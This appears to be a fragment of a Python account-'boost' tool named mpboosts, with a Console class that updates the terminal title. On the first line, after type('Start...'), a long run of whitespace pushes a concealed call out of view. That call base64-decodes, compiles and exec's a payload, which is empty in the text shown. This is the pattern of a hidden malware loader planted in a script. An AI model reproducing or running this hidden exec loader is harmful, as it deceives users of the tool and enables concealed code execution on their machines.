...
type('Start...')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
class Console:
    """Console utils"""
    ...
    def update_title() -> None:
        ...
        while True:
            ...
            os.system(
                f"title mpboosts │ Activated Accounts: {activated_accounts} │ Elapsed: {elapsed_time}"
            )
            thread_lock.release()
